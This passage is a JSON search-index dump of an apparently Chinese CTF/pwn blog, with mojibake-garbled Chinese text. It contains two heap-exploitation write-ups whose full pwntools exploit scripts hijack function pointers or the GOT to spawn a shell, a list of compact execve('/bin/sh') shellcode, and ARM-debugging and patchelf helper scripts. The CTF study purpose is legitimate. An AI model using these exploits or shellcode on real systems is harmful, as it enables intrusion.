error(f\u0026#34;æ— æ³•è½¬æ¢{value}æˆ–ä¸å­˜åœ¨ç±»å‹{c_type}\u0026#34;) def load_libc(libc_name: str, *args, **kwargs) -\u0026gt; ctypes.CDLL: return ctypes.CDLL(libc_name, args, kwargs) def recv_and_transform(prev_string: str = None, from_bytes: bool = True,\\ is_canary: bool = False, bound: str = None) -\u0026gt; int: if prev_string is not None: p.recvuntil(flat(prev_string)) if bound is not None: bound = flat(bound) if from_bytes: if bound is not None: return ug(p.recvuntil(bound)[:-len(bound)]) if if_32: return ug(p.recv(4)) else: if is_canary: return ug(p.recv(7).rjust(8, b\u0026#34;\\x00\u0026#34;)) else: return ug(p.recv(6).ljust(8, b\u0026#34;\\x00\u0026#34;)) else: if bound is not None: return int(p.recvuntil(bound)[:-len(bound)], 16) else: if if_32: return int(p.recv(10), 16) else: if is_canary: return int(p.recv(18), 16) else: return int(p.recv(14), 16) def formula_compute(formula: bytes, precise: bool = False): if isinstance(formula, bytes): formula = formula.decode(\u0026#34;UTF-8\u0026#34;) formula = formula.strip() formula = formula.strip(\u0026#34;\\n\u0026#34;) formula = formula.replace(\u0026#34;x\u0026#34;, \u0026#34;*\u0026#34;) formula = formula.replace(\u0026#34;^\u0026#34;, \u0026#34;**\u0026#34;) formula = formula.replace(\u0026#34;Ã·\u0026#34;, \u0026#34;/\u0026#34;) if not precise: formula = formula.replace(\u0026#34;//\u0026#34;, \u0026#34;/\u0026#34;) formula = formula.replace(\u0026#34;/\u0026#34;, \u0026#34;//\u0026#34;) return bytes(str(eval(formula)), encoding=\u0026#34;UTF-8\u0026#34;) ... def allocate(size: int, content: bytes) -\u0026gt; None: sendline_after_clean(b\u0026#34;1\u0026#34;) # sendline_after_clean(str(index)) sendline_after_clean(str(size)) sendline_after_clean(content) def remove(index: int) -\u0026gt; None: sendline_after_clean(b\u0026#34;4\u0026#34;) sendline_after_clean(str(index)) def show(index: int): sendline_after_clean(b\u0026#34;3\u0026#34;) sendline_after_clean(str(index)) def change(index: int, content: bytes, newline: bool = True) -\u0026gt; None: sendline_after_clean(b\u0026#34;2\u0026#34;) sendline_after_clean(str(index)) if newline: sendline_after_clean(content) else: send_after_clean(content) allocate(0x18, b\u0026#34;0\u0026#34;) allocate(0x18, b\u0026#34;1\u0026#34;) allocate(0x18, b\u0026#34;2\u0026#34;) payload = flat([ \u0026#34;/bin/sh\\x00\u0026#34;, 0, 0 ]) + p8(0x81) change(0, payload, False) remove(1) allocate(0x70, flat([ pg(0)*8, 8, m_elf.got[\u0026#39;free\u0026#39;] ])) show(2) free_got = recv_and_transform(\u0026#34;Content : \u0026#34;) base_addr = free_got - libc.sym[\u0026#39;free\u0026#39;] system_addr = base_addr + libc.sym[\u0026#39;system\u0026#39;] suclog( free_got=free_got, base_addr=base_addr, system_addr=system_addr ) change(2, pg(system_addr)) remove(0) interactive_after_clean() ","date":"2023å¹´01æœˆ03æ—¥","permalink":"https://peterliuzhi.top/writeup/hitcontraining_heapcreator/","section":"writeup","summary":"No man is free who is not master of himself. â€” Epictetus åŸé¢˜é“¾æ¥ checksecæŸ¥çœ‹ç¨‹åºæ¶æ„ idaæŸ¥çœ‹ä¼ªCä»£ç  create_heap åˆ†é…çš„chunkç»“æ„ä½“åŒ…æ‹¬ä¸€ä¸ªä¿å­˜sizeçš„intï¼Œå’Œä¸€ä¸ªæŒ‡å‘å…¶ä»–å†…å­˜","tags":["pwn","chunk overlap","off by one"],"title":"hitcontraining_heapcreator"},{"categories":["tricks","é“¾æ¥é›†é”¦"],"contents":" True happiness means forging a strong spirit that is undefeated, no matter how trying our circumstances. â€” Daisaku Ikeda\nGlibc source code (glibc-2.36.9000) - Bootlinï¼Œåœ¨çº¿æŸ¥çœ‹æºç \nIndex of /gnu/glibcï¼Œç›´æ¥ä»å®˜ç½‘ä¸‹è½½æºç \nGitHub - bminor/glibc: Unofficial mirror of sourceware glibc repository. Updated daily.ä½¿ç”¨git checkoutæ›´æ¢ç‰ˆæœ¬\nglibc/glibc/ Source Treeï¼Œåœ¨çº¿æºç æµè§ˆå™¨\n","date":"2023å¹´01æœˆ03æ—¥","permalink":"https://peterliuzhi.top/tricks/glibc-source-code%E6%BA%90%E7%A0%81/","section":"tricks","summary":"True happiness means forging a strong spirit that is undefeated, no matter how trying our circumstances. â€” Daisaku Ikeda Glibc source code (glibc-2.36.9000) - Bootlinï¼Œåœ¨çº¿æŸ¥çœ‹æºç  Index of /gnu/glibcï¼Œç›´æ¥ä»å®˜ç½‘ä¸‹è½½æºç  GitHub - bminor/glibc: Unofficial mirror of sourceware glibc repository. Updated daily","tags":["pwn","glibc","æºç "],"title":"glibc source codeæºç "},{"categories":["tricks","é“¾æ¥é›†é”¦"],"contents":" Love is the attempt to form a friendship inspired by beauty. â€” Cicero\nLinux System Calls quick and easyï¼Œç¾åŒ–å¾ˆä¸é”™\nå¯æœç´¢çš„syscallè¡¨ï¼Œä½†ç›®å‰åªæ”¯æŒx86_64\nChromium OS Docs - Linux System Call Tableï¼Œå’ŒLinuxå¤§è‡´ä¸€æ ·ï¼Œä½“éªŒä¸é”™\nMicrosoft Windows System Call Table (XP/2003/Vista/2008/7/2012/8/10)ï¼Œé˜´é—´å®¡ç¾\nLinux System Call Table for x86 64 Â· Ryan A. Chapmanï¼Œä¸ªäººåšå®¢å¤‡ä»½\nlinux/syscall_64.tbl at v4.17 Â· torvalds/linux Â· GitHubï¼Œæçº³æ–¯åœ¨GitHubä¸Šå¼€æºçš„Linuxå†…é™„çš„tableæ–‡ä»¶\nlinux/syscall_32.tbl at v4.17 Â· torvalds/linux Â· GitHubï¼Œæçº³æ–¯åœ¨GitHubä¸Šå¼€æºçš„Linuxå†…é™„çš„tableæ–‡ä»¶\nlinux/unistd.h at v4.17 Â· torvalds/linux Â· GitHubï¼Œarmç‰ˆæœ¬çš„\nlinux/syscall.tbl at v4.17 Â· torvalds/linux Â· GitHubï¼Œarm64ç‰ˆæœ¬çš„\nWhere do you find the syscall table for Linux? - Unix \u0026amp; Linux Stack Exchange\n","date":"2023å¹´01æœˆ03æ—¥","permalink":"https://peterliuzhi.top/tricks/%E5%90%84%E5%B9%B3%E5%8F%B0syscall%E5%BA%8F%E5%8F%B7/","section":"tricks","summary":"Love is the attempt to form a friendship inspired by beauty. â€” Cicero Linux System Calls quick and easyï¼Œç¾åŒ–å¾ˆä¸é”™ å¯æœç´¢çš„syscallè¡¨ï¼Œä½†ç›®å‰åªæ”¯æŒx86_64 Chromium OS Docs - Linux System Call Tableï¼Œå’ŒLinuxå¤§è‡´ä¸€","tags":["pwn","syscall"],"title":"å„å¹³å°syscallåºå·"},{"categories":["tricks"],"contents":" Motivation is the art of getting people to do what you want them to do because they want to do it. â€” Dwight D. Eisenhower\nåˆå§‹åŒ–armè°ƒè¯•ç¯å¢ƒ sudo apt-get install qemu-user qemu-user-static gcc-aarch64-linux-gnu binutils-aarch64-linux-gnu binutils-aarch64-linux-gnu-dbg build-essential qemu gdbserver gdb-multiarchÂ libc6-arm64-cross æœ‰äº›Ubuntuç‰ˆæœ¬å¯èƒ½æœ‰äº›åº“æ²¡æœ‰ï¼Œæˆ–è€…æ›´åäº†ï¼Œå¦‚æœä»…è°ƒè¯•å¯ä»¥åªç”¨ï¼š\nsudo apt-get install qemu gdbserver gdb-multiarch libc6-arm64-cross å…¶ä¸­libc6-arm64-crossåœ¨ä¸åŒç³»ç»Ÿåå­—å¯èƒ½ä¸ä¸€æ ·ï¼Œå¯ä»¥ä½¿ç”¨ä»¥ä¸‹æŒ‡ä»¤æ£€æŸ¥ï¼š\nsudo apt search \u0026#34;libc6-\u0026#34; | grep \u0026#34;arm\u0026#34; æ›´å¤šé˜…è¯»ï¼š\narm pwnå…¥é—¨ | blingbling\u0026rsquo;s blog ç”¨qemuåœ¨æŒ‡å®šç«¯å£è¿è¡Œç¨‹åºå¹¶è‡ªåŠ¨ç”¨gdbè¿æ¥è¯¥ç¨‹åº å°†ä¸‹åˆ—ä»£ç ä¿å­˜ä¸ºè„šæœ¬ARMï¼Œå¤åˆ¶åˆ°/usr/local/bin/å¹¶å¢åŠ å¯æ‰§è¡Œæƒé™ï¼Œä½¿ç”¨æ–¹æ³•ï¼š\nARM [ç«¯å£å·] [ç¨‹åºå] #!/bin/bash if [[ \u0026#34;$*\u0026#34; =~ \u0026#34;--help\u0026#34; ]] || [[ \u0026#34;$*\u0026#34; =~ \u0026#34;-h\u0026#34; ]]; then echo \u0026#34;ã€ç”¨æ³•ã€‘$(basename $0) ç¨‹åºè¿è¡Œçš„ç«¯å£å· ç¨‹åºæ–‡ä»¶å\u0026#34; echo \u0026#34;è„šæœ¬è‡ªåŠ¨åˆ¤æ–­32ä½è¿˜æ˜¯64ä½ï¼ŒåŒæ—¶è®¾ç½®å¤§å°ç«¯\u0026#34; echo \u0026#34;ç¨‹åºè¿è¡Œçš„ç«¯å£å·å’Œç¨‹åºæ–‡ä»¶åä¸å¾—ç¡®å®ï¼Œä¸ç„¶è„šæœ¬ä¸ä¼šè¿è¡Œ\u0026#34; echo \u0026#34;ç¤ºä¾‹ï¼š\u0026#34; echo -e \u0026#34;\\t$(basename $0) 1234 example\u0026#34; echo \u0026#34;By PeterLiu\u0026#34; exit 0 fi if [[ -z $1 ]];then echo \u0026#34;ç¼ºå¤±ç«¯å£å·ï¼\u0026#34; exit 3 elif [[ ! $1 =~ ^[0-9]+$ ]];then echo \u0026#34;ç«¯å£å·å¿…é¡»æ˜¯æ•°å­—ï¼\u0026#34; exit 3 fi if [[ -z $2 ]];then echo \u0026#34;ç¼ºå¤±ç¨‹åºåï¼\u0026#34; exit 4 fi result=`file $2` if [[ ! $result =~ \u0026#34;ARM\u0026#34; ]];then echo \u0026#34;ä¸æ˜¯ARMæ¶æ„ç¨‹åºï¼\u0026#34; exit 1 fi if [[ $result =~ \u0026#34;32-bit\u0026#34; ]];then echo \u0026#34;$1æ˜¯32ä½ç³»ç»Ÿ\u0026#34; qemu-arm -g $1 $2 \u0026amp; elif [[ $result =~ \u0026#34;64-bit\u0026#34; ]];then echo \u0026#34;$1æ˜¯64ä½ç³»ç»Ÿ\u0026#34; qemu-aarch64 -L /usr/aarch64-linux-gnu -g $1 $2 \u0026amp; else echo \u0026#34;æ— æ³•åˆ¤æ–­æ¶æ„ï¼\u0026#34; exit 2 fi endian=`readelf -h typo | grep endian` if [[ $endian =~ \u0026#34;little endian\u0026#34; ]];then gdb $2 -ex \u0026#34;set endian little\u0026#34; \\ -ex \u0026#34;set architecture arm\u0026#34; \\ -ex \u0026#34;target remote localhost:$1 \u0026#34; else gdb $2 -ex \u0026#34;set endian big\u0026#34; \\ -ex \u0026#34;set architecture arm\u0026#34; \\ -ex \u0026#34;target remote localhost:$1 \u0026#34; fi ","date":"2023å¹´01æœˆ02æ—¥","permalink":"https://peterliuzhi.top/tricks/pwn%E4%B8%AD%E8%B0%83%E8%AF%95arm%E7%A8%8B%E5%BA%8F/","section":"tricks","summary":"Motivation is the art of getting people to do what you want them to do because they want to do it. â€” Dwight D. Eisenhower åˆå§‹åŒ–armè°ƒè¯•ç¯å¢ƒ sudo apt-get install qemu-user qemu-user-static gcc-aarch64-linux-gnu binutils-aarch64-linux-gnu binutils-aarch64-linux-gnu-dbg build-essential qemu gdbserver gdb-multiarch libc6-arm64-cross æœ‰äº›Ubuntuç‰ˆæœ¬å¯èƒ½æœ‰äº›åº“æ²¡æœ‰ï¼Œæˆ–è€…æ›´åäº†ï¼Œå¦‚æœä»…","tags":["pwn"],"title":"PWNä¸­è°ƒè¯•armç¨‹åº"},{"categories":["tricks"],"contents":" The industrial landscape is already littered with remains of once successful companies that could not adapt their strategic vision to altered conditions of competition. â€” Ralph Abernathy\næœ‰äº›æ—¶å€™å› ä¸ºæ ˆçš„åŸå› ï¼Œç¨‹åºè¿è¡Œæ—¶ä¼šç ´åshellcodeï¼Œè¿™æ—¶å€™å¯ä»¥åŠ ä¸€å †retæ¥æŠ¬é«˜æ ˆï¼Œä¹Ÿå¯ä»¥é€‰æ‹©æ›´ä¸ºç®€çŸ­çš„shellcode\n32ä½shellcode shellcode_32 = asm( \u0026#39;\u0026#39;\u0026#39; xor ecx, ecx mul ecx push ecx push 0x68732f2f push 0x6e69622f mov ebx, esp mov al, 0xb int 0x80 \u0026#39;\u0026#39;\u0026#39; ) æˆ–\nshellcode_32 = b\u0026#39;\\x31\\xc9\\xf7\\xe1\\x51\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\xb0\\x0b\\xcd\\x80\u0026#39; æ•ˆæœå¯¹æ¯” 64ä½shellcode shellcode_64 = asm( \u0026#39;\u0026#39;\u0026#39; dec eax xor esi, esi push esi dec eax mov edi, 0x6e69622f das das jae 0x76 push edi push esp pop edi push 0x3b pop eax cdq syscall \u0026#39;\u0026#39;\u0026#39; ) æˆ–\nshellcode_64 = b\u0026#39;\\x48\\x31\\xf6\\x56\\x48\\xbf\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x57\\x54\\x5f\\x6a\\x3b\\x58\\x99\\x0f\\x05\u0026#39; æ•ˆæœå¯¹æ¯” ","date":"2023å¹´01æœˆ02æ—¥","permalink":"https://peterliuzhi.top/tricks/%E8%BE%83%E4%B8%BA%E7%AE%80%E7%9F%AD%E7%9A%84shellcode/","section":"tricks","summary":"The industrial landscape is already littered with remains of once successful companies that could not adapt their strategic vision to altered conditions of competition. â€” Ralph Abernathy æœ‰äº›æ—¶å€™å› ä¸ºæ ˆçš„åŸå› ï¼Œç¨‹åºè¿è¡Œæ—¶ä¼šç ´åshellcodeï¼Œè¿™æ—¶å€™å¯ä»¥åŠ ä¸€å †retæ¥æŠ¬é«˜æ ˆï¼Œä¹Ÿå¯ä»¥","tags":["pwn"],"title":"è¾ƒä¸ºç®€çŸ­çš„shellcode"},{"categories":["tricks","scripts"],"contents":" A true friend freely, advises justly, assists readily, adventures boldly, takes all patiently, defends courageously, and continues a friend unchangeably. â€” William C. Menninger\nä½¿ç”¨æ–¹æ³• changelibc ç¨‹åºæ–‡ä»¶å ldåå­— libcè·¯å¾„ ldåå­—å’Œlibcè·¯å¾„å¦‚æœä¸æƒ³æ”¹å˜å¯ä»¥ç”¨0ã€$ã€?ã€:å››ä¸ªåˆ†éš”ç¬¦ä»£æ›¿\nå¦‚æœä¸è¾“å…¥ldåå­—å’Œlibcè·¯å¾„ï¼Œç¨‹åºä¼šåœ¨ä¸­é€”æš‚åœå¹¶è¯¢é—®ï¼Œå¦‚æœç›´æ¥å›è½¦å°±ä»£è¡¨ä¸æ”¹å˜è¯¥é¡¹\næ³¨æ„ldåå­—æ˜¯è·¯å¾„+åå­—ï¼Œè€Œlibcè·¯å¾„æ˜¯è·¯å¾„ï¼Œä¸è¦åŠ ä¸Šlibcçš„åå­—ï¼ˆå¦‚./libc/libc.so.6ï¼Œä¸è¦å†™./libc/libc.so.6ï¼Œå†™./libcï¼‰\nè„šæœ¬ #!/bin/bash if [[ \u0026#34;$*\u0026#34; =~ \u0026#34;--help\u0026#34; ]] || [[ \u0026#34;$*\u0026#34; =~ \u0026#34;-h\u0026#34; ]]; then echo \u0026#34;ã€ç”¨æ³•ã€‘$(basename $0) ç¨‹åºæ–‡ä»¶å ldåå­— libcè·¯å¾„\u0026#34; echo \u0026#34;ldåå­—å’Œlibcè·¯å¾„å¦‚æœä¸æƒ³æ”¹å˜å¯ä»¥ç”¨0ã€$ã€?ã€:å››ä¸ªåˆ†éš”ç¬¦ä»£æ›¿\u0026#34; echo \u0026#34;å¦‚æœä¸è¾“å…¥ldåå­—å’Œlibcè·¯å¾„ï¼Œç¨‹åºä¼šåœ¨ä¸­é€”æš‚åœå¹¶è¯¢é—®ï¼Œå¦‚æœç›´æ¥å›è½¦å°±ä»£è¡¨ä¸æ”¹å˜è¯¥é¡¹\u0026#34; echo \u0026#34;æ³¨æ„ldåå­—æ˜¯è·¯å¾„+åå­—ï¼Œè€Œlibcè·¯å¾„æ˜¯è·¯å¾„ï¼Œä¸è¦åŠ ä¸Šlibcçš„åå­—ï¼ˆå¦‚./libc/libc.so.6ï¼Œä¸è¦å†™./libc/libc.so.6ï¼Œå†™./libcï¼‰\u0026#34; echo \u0026#34;By PeterLiu\u0026#34; exit 0 fi filename=$1 while [ -z $filename ]; do echo -n \u0026#34;è¯·è¾“å…¥ç¨‹åºæ–‡ä»¶çš„è·¯å¾„ï¼š\u0026#34; read filename done ldname=`ldd $filename | grep ld | awk -F \u0026#39;=\u0026gt;\u0026#39; \u0026#39;{print $2}\u0026#39; | awk -F \u0026#39;(\u0026#39; \u0026#39;{print $1}\u0026#39; | awk \u0026#39;$1=$1\u0026#39;` libcname=`ldd $filename | grep libc | awk -F \u0026#39;=\u0026gt;\u0026#39; \u0026#39;{print $2}\u0026#39; | awk -F \u0026#39;(\u0026#39; \u0026#39;{print $1}\u0026#39; | awk \u0026#39;$1=$1\u0026#39;` tmp=\u0026#34;\u0026#34; if [ -z \u0026#34;$2\u0026#34; ]; then echo -n \u0026#34;è¯·è¾“å…¥ldçš„è·¯å¾„+åå­—ï¼ˆç›´æ¥å›è½¦ä»¥è·³è¿‡ï¼‰ï¼š\u0026#34; read tmp if [ -n tmp ]; then patchelf --set-interpreter $tmp $filename else echo \u0026#34;ä¸æ”¹å˜åŸæœ‰libcï¼\u0026#34; fi else if [ \u0026#34;$2\u0026#34; == \u0026#34;0\u0026#34; ] || [ \u0026#34;$2\u0026#34; == \u0026#34;$\u0026#34; ] || [ \u0026#34;$2\u0026#34; == \u0026#34;?\u0026#34; ] || [ \u0026#34;$2\u0026#34; == \u0026#34;:\u0026#34; ]; then echo \u0026#34;ä¸æ”¹å˜åŸæœ‰ldï¼\u0026#34; else patchelf --set-interpreter $2 $filename fi fi if [ -z \u0026#34;$3\u0026#34; ]; then echo -n \u0026#34;è¯·è¾“å…¥libcçš„è·¯å¾„ï¼Œæ²¡æœ‰åå­—ï¼ˆç›´æ¥å›è½¦ä»¥è·³è¿‡ï¼‰ï¼š\u0026#34; read tmp if [ -n tmp ]; then patchelf --set-rpath $tmp $filename else echo \u0026#34;ä¸æ”¹å˜åŸæœ‰libcï¼\u0026#34; fi else if [ \u0026#34;$3\u0026#34; == \u0026#34;0\u0026#34; ] || [ \u0026#34;$3\u0026#34; == \u0026#34;$\u0026#34; ] || [ \u0026#34;$3\u0026#34; == \u0026#34;?\u0026#34; ] || [ \u0026#34;$3\u0026#34; == \u0026#34;:\u0026#34; ]; then echo \u0026#34;ä¸æ”¹å˜åŸæœ‰libcï¼\u0026#34; else patchelf --set-rpath $3 $filename fi fi ldd $filename ","date":"2023å¹´01æœˆ02æ—¥","permalink":"https://peterliuzhi.top/tricks/patchelf%E6%9B%B4%E6%94%B9libc%E8%84%9A%E6%9C%AC/","section":"tricks","summary":"A true friend freely, advises justly, assists readily, adventures boldly, takes all patiently, defends courageously, and continues a friend unchangeably. â€” William C. Menninger ä½¿ç”¨æ–¹æ³• changelibc ç¨‹åºæ–‡ä»¶å ldåå­— libcè·¯å¾„ ldåå­—å’Œlibcè·¯å¾„å¦‚æœä¸æƒ³æ”¹å˜å¯ä»¥ç”¨0ã€$ã€?ã€:å››ä¸ªåˆ†éš”","tags":["pwn","patchelf"],"title":"patchelfæ›´æ”¹libcè„šæœ¬"},{"categories":["writeup"],"contents":" Courage is going from failure to failure without losing enthusiasm. â€” Winston Churchill\nåŸé¢˜é“¾æ¥\nchecksecæŸ¥çœ‹ç¨‹åºæ¶æ„ idaæŸ¥çœ‹ä¼ªCä»£ç  èœå•å †é¢˜ï¼Œåªæœ‰ä¸‰ä¸ªåŠŸèƒ½ï¼Œåˆ†é…ç©ºé—´ï¼Œé‡Šæ”¾ç©ºé—´ï¼Œæ˜¾ç¤ºå†…å®¹ï¼Œæ— æ³•åœ¨åˆ†é…äº†ç©ºé—´åæ›´æ”¹ç©ºé—´çš„å†…å®¹ï¼Œè¿™æ„å‘³ç€æˆ‘ä»¬è¦åœ¨åˆ†é…ç©ºé—´çš„æ—¶å€™å°±æŠŠpayloadæ”¾è¿›å»\nallocate å¯ä»¥çœ‹åˆ°ï¼Œåˆ†é…çš„ç©ºé—´æœ‰ä¸¤ç§ç±»å‹å¯é€‰ï¼š\nä¸€ç§æ˜¯å­—ç¬¦ä¸²å‹ï¼Œä¼šåˆ†é…ç¬¬äºŒå—ç©ºé—´ï¼ŒåŒæ—¶è¿™å—ç©ºé—´çš„å¤§å°åœ¨0x400ä»¥ä¸‹ä»»é€‰ ä¸€ç§æ˜¯æ•°å­—å‹ï¼Œä¸ä¼šåˆ†é…ç¬¬äºŒå—ç©ºé—´ï¼Œåªä¼šåˆ†é…ç¬¬ä¸€å—å¤§å°ä¸º0xCçš„ç©ºé—´ åŒæ—¶ï¼Œæˆ‘ä»¬å‘ç°ï¼Œé‡Šæ”¾ç©ºé—´å’Œæ˜¾ç¤ºå†…å®¹çš„å‡½æ•°æ˜¯å­˜æ”¾åœ¨ç¬¬ä¸€æ¬¡åˆ†é…çš„ç©ºé—´ä¸­çš„ï¼Œå› æ­¤è¿™ä¸ªç»“æ„ç±»ä¼¼äºï¼š\nstruct chunk{ void* show; void* remove; void* content; //å› ä¸º32ä½ç³»ç»Ÿä¸­intå¤§å°ç­‰äºæŒ‡é’ˆå¤§å°ï¼Œæ‰€ä»¥è¿™ä¸ªcontentå¯ä»¥å¤ç”¨ä¿å­˜int } é‚£ä¹ˆæˆ‘ä»¬çš„æ€è·¯å¤§æ¦‚å°±æ˜¯é€šè¿‡tcache binçš„LIFOåŸåˆ™é‡Šæ”¾åå†åˆ†é…å®ç°é”™ä½ï¼Œæ§åˆ¶ä¸¤ä¸ªå‡½æ•°æŒ‡é’ˆåï¼Œå†é€šè¿‡UAFäºŒæ¬¡é‡Šæ”¾chunk\nexp # è‡ªåŠ¨ç”Ÿæˆå¤´éƒ¨ from pwn import * from pwn import p64, p32, u32, u64, p8 from LibcSearcher import LibcSearcher import ctypes pss: bool = False fn: str = \u0026#34;./ciscn_2019_n_3\u0026#34; libc_name: str = \u0026#34;/lib/i386-linux-gnu/libc.so.6\u0026#34; port: str = \u0026#34;25949\u0026#34; if_32: bool = True if_debug: bool = False pg = p32 if if_32 else p64 ug = u32 if if_32 else u64 context(log_level=\u0026#34;debug\u0026#34;, arch=\u0026#34;i386\u0026#34; if if_32 else \u0026#34;amd64\u0026#34;, os=\u0026#34;linux\u0026#34;) context.terminal = [\u0026#34;tmux\u0026#34;, \u0026#34;splitw\u0026#34;, \u0026#34;-h\u0026#34;] env = {\u0026#34;LD_PRELOAD\u0026#34;: libc_name} if pss: p = remote(\u0026#34;node4.buuoj.cn\u0026#34;, port) else: if if_debug: p = gdb.debug(fn, \u0026#34;\u0026#34;\u0026#34; b* 0x804899C c \u0026#34;\u0026#34;\u0026#34;) else: p = process(fn) # ä¸¤ä¸ªelfï¼Œæ³¨æ„libcçš„ç‰ˆæœ¬ m_elf = ELF(fn) libc = ELF(libc_name) def suclog(**kwargs): for k, v in kwargs.items(): if isinstance(v, int): success(f\u0026#34;{k} =\u0026gt; {hex(v)}\u0026#34;) else: success(f\u0026#34;{k} =\u0026gt; {v}\u0026#34;) def send_after_clean(content: bytes = b\u0026#34;\u0026#34;, until: bytes = None, timeout: float = 0.05, no_show: bool = True) -\u0026gt; bytes: if until is not None: p.recvuntil(flat(until)) received = p.clean(timeout) if not no_show: info(f\u0026#34;received:\\n{received.decode(\u0026#39;UTF-8\u0026#39;)}\u0026#34;) p.send(flat(content)) return received def sendline_after_clean(content: bytes = b\u0026#34;\u0026#34;, until: bytes = None, timeout: float = 0.05, no_show: bool = True) -\u0026gt; bytes: send_after_clean([content, p.newline], until, timeout, no_show) def interactive_after_clean(timeout: int = 0.05, no_show: bool = True): received = p.clean(timeout) if not no_show: info(f\u0026#34;received:\\n{received.decode(\u0026#39;UTF-8\u0026#39;)}\u0026#34;) p.interactive() def c_val(value: int, c_type: string) -\u0026gt; bytes: type_dict = { \u0026#34;long\u0026#34;: ctypes.c_long, \u0026#34;longlong\u0026#34;: ctypes.c_longlong, \u0026#34;ulong\u0026#34;: ctypes.c_ulong, \u0026#34;ulonglong\u0026#34;: ctypes.c_ulonglong, \u0026#34;int8\u0026#34;: ctypes.c_int8, \u0026#34;int16\u0026#34;: ctypes.c_int16, \u0026#34;int32\u0026#34;: ctypes.c_int32, \u0026#34;int64\u0026#34;: ctypes.c_int64, \u0026#34;uint8\u0026#34;: ctypes.c_uint8, \u0026#34;uint16\u0026#34;: ctypes.c_uint16, \u0026#34;uint32\u0026#34;: ctypes.c_uint32, \u0026#34;uint64\u0026#34;: ctypes.c_uint64, \u0026#34;int\u0026#34;: ctypes.c_int, \u0026#34;char\u0026#34;: ctypes.c_char, \u0026#34;bool\u0026#34;: ctypes.c_bool, \u0026#34;float\u0026#34;: ctypes.c_float, \u0026#34;double\u0026#34;: ctypes.c_double, \u0026#34;ushort\u0026#34;: ctypes.c_ushort, \u0026#34;byte\u0026#34;: ctypes.c_byte, \u0026#34;longdouble\u0026#34;: ctypes.c_longdouble, \u0026#34;size_t\u0026#34;: ctypes.c_size_t, \u0026#34;ssize_t\u0026#34;: ctypes.c_ssize_t, \u0026#34;ubyte\u0026#34;: ctypes.c_ubyte } try: return bytes(str(type_dict[c_type](value).value), encoding=\u0026#34;UTF-8\u0026#34;) except: try: return bytes(str(eval(f\u0026#34;ctypes.c_{c_type}(value).value\u0026#34;)), encoding=\u0026#34;UTF-8\u0026#34;) except: error(f\u0026#34;æ— æ³•è½¬æ¢{value}æˆ–ä¸å­˜åœ¨ç±»å‹{c_type}\u0026#34;) def load_libc(libc_name: str, *args, **kwargs) -\u0026gt; ctypes.CDLL: return ctypes.CDLL(libc_name, args, kwargs) def recv_and_transform(prev_string: str = None, from_bytes: bool = True, is_canary: bool = False, bound: str = None) -\u0026gt; int: if prev_string is not None: p.recvuntil(flat(prev_string)) if bound is not None: bound = flat(bound) if from_bytes: if bound is not None: return ug(p.recvuntil(bound)[:-len(bound)]) if if_32: return ug(p.recv(4)) else: if is_canary: return ug(p.recv(7).rjust(8, b\u0026#34;\\x00\u0026#34;)) else: return ug(p.recv(6).ljust(8, b\u0026#34;\\x00\u0026#34;)) else: if bound is not None: return int(p.recvuntil(bound)[:-len(bound)], 16) else: if if_32: return int(p.recv(10), 16) else: if is_canary: return int(p.recv(18), 16) else: return int(p.recv(14), 16) def formula_compute(formula: bytes, precise: bool = False): if isinstance(formula, bytes): formula = formula.decode(\u0026#34;UTF-8\u0026#34;) formula = formula.strip() formula = formula.strip(\u0026#34;\\n\u0026#34;) formula = formula.replace(\u0026#34;x\u0026#34;, \u0026#34;*\u0026#34;) formula = formula.replace(\u0026#34;^\u0026#34;, \u0026#34;**\u0026#34;) formula = formula.replace(\u0026#34;Ã·\u0026#34;, \u0026#34;/\u0026#34;) if not precise: formula = formula.replace(\u0026#34;//\u0026#34;, \u0026#34;/\u0026#34;) formula = formula.replace(\u0026#34;/\u0026#34;, \u0026#34;//\u0026#34;) return bytes(str(eval(formula)), encoding=\u0026#34;UTF-8\u0026#34;) ... def allocate(index: int, size: int, type: int, content: bytes) -\u0026gt; None: sendline_after_clean(b\u0026#34;1\u0026#34;) sendline_after_clean(str(index)) sendline_after_clean(str(type)) if type == 2: sendline_after_clean(str(size)) sendline_after_clean(content) def remove(index: int) -\u0026gt; None: sendline_after_clean(b\u0026#34;2\u0026#34;) sendline_after_clean(str(index)) def show(index: int): sendline_after_clean(b\u0026#34;3\u0026#34;) sendline_after_clean(str(index)) # def change(index: int, content: bytes) -\u0026gt; None: # sendline_after_clean(b\u0026#34;4\u0026#34;) # sendline_after_clean(str(index)) # sendline_after_clean(content) allocate(0, 0xC, 2, \u0026#34;0\u0026#34;) allocate(1, 0x80, 1, \u0026#34;1\u0026#34;) remove(0) remove(1) payload = flat([ \u0026#34;sh\\x00\\x00\u0026#34;, m_elf.plt[\u0026#39;system\u0026#39;] ]) allocate(2, 0xC, 2, payload) remove(0) interactive_after_clean() ","date":"2023å¹´01æœˆ02æ—¥","permalink":"https://peterliuzhi.top/writeup/ciscn_2019_n_3/","section":"writeup","summary":"Courage is going from failure to failure without losing enthusiasm. â€” Winston Churchill åŸé¢˜é“¾æ¥ checksecæŸ¥çœ‹ç¨‹åºæ¶æ„ idaæŸ¥çœ‹ä¼ªCä»£ç  èœå•å †é¢˜ï¼Œåªæœ‰ä¸‰ä¸ªåŠŸèƒ½ï¼Œåˆ†é…ç©ºé—´ï¼Œé‡Šæ”¾ç©ºé—´ï¼Œæ˜¾ç¤ºå†…å®¹ï¼Œæ— æ³•åœ¨åˆ†é…äº†ç©ºé—´","tags":["pwn","LIFOé”™ä½","UAF","æ›´æ”¹chunkå†…å‡½æ•°æŒ‡é’ˆ"],"title":"ciscn_2019_n_3"},{"categories":null,"contents":" Until you make peace with who you are, you will never be content with what you have. â€” Doris Mortman\næœ¬æ ç›®ç”¨äºæ”¶é›†å„ç§æ‚é¡¹éšç¬”\n","date":"2022å¹´12æœˆ29æ—¥","permalink":"https://peterliuzhi.top/posts/hello/","section":"posts","summary":"Until you make peace with who you are, you will never be content with what you have. â€” Doris Mortman æœ¬æ ç›®ç”¨äºæ”¶é›†å„ç§æ‚é¡¹éšç¬”","tags":null,"title":"Hello"},{"categories":null,"contents":"","date":"2022å¹´12æœˆ29æ—¥","permalink":"https://peterliuzhi.top/search.html/","section":"","summary":"","tags":null,"title":"æœç´¢ç»“æœ"},{"categories":["writeup"],"contents":" Sometimes being a friend means mastering the art of timing. There is a time for silence. A time to let go and allow people to hurl themselves into their own destiny. And a time to prepare to pick up the pieces when it\u0026rsquo;s all over. â€” Octavia 